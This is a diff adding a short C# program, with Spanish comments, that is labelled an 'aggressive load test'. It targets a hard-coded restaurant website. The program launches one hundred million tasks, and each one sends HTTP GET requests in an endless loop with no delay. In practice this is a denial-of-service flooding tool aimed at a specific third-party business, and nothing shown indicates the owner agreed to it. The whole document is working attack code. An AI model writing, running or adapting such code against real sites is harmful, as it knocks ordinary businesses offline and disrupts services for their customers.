@@ -1,0 +1,44 @@
+﻿using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+class Program
+{
+    static readonly HttpClient client = new HttpClient();
+    // Número de tareas paralelas para enviar solicitudes simultáneamente.
+    const int numberOfTasks = 100000000;
+
+    static async Task Main(string[] args)
+    {
+        string targetUrl = "https://www.restaurantemonpiedra.com/";
+        Console.WriteLine("Iniciando pruebas de carga agresivas...");
+
+        Task[] tasks = new Task[numberOfTasks];
+
+        for (int i = 0; i < numberOfTasks; i++)
+        {
+            // Inicia cada tarea para enviar solicitudes continuamente.
+            tasks[i] = Task.Run(async () =>
+            {
+                while (true) // Cada tarea ejecuta un bucle infinito enviando solicitudes.
+                {
+                    try
+                    {
+                        HttpResponseMessage response = await client.GetAsync(targetUrl);
+                        response.EnsureSuccessStatusCode();
+                        // La respuesta se ignora para enfocarnos en generar carga.
+
+                        // No hay retraso aquí, enviando la siguiente solicitud inmediatamente.
+                    }
+                    catch (HttpRequestException e)
+                    {
+                        Console.WriteLine("\nExcepción encontrada:");
+                        Console.WriteLine(e.Message);
+                        break;
+                    }
+                }
+            });
+        }
+        await Task.WhenAll(tasks);
+    }
+}
